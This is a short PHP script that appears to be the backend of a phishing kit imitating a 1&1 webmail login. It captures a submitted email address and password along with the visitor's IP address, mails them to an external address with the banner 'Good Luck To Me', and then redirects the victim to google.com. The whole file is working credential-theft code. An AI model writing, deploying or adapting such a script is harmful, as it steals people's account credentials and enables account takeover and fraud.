<?php
$ip = getenv("REMOTE_ADDR");
$message .= "--------->My  Webmail<----------\n";
$message .= "MUMU USER   : ".$_POST['temail']."\n";
$message .= "MUMU PASS   : ".$_POST['tpass']."\n";
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "IP  : ".$ip."\n";
$message .= "--------> Good Luck To Me <-------\n";

$send = "coolito@11298310442.com";
$subject = "2019 1&1 - $ip";
$headers = "From: MuMu Email<m1rt@fucknet.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
header("Location: https://google.com/");


?>
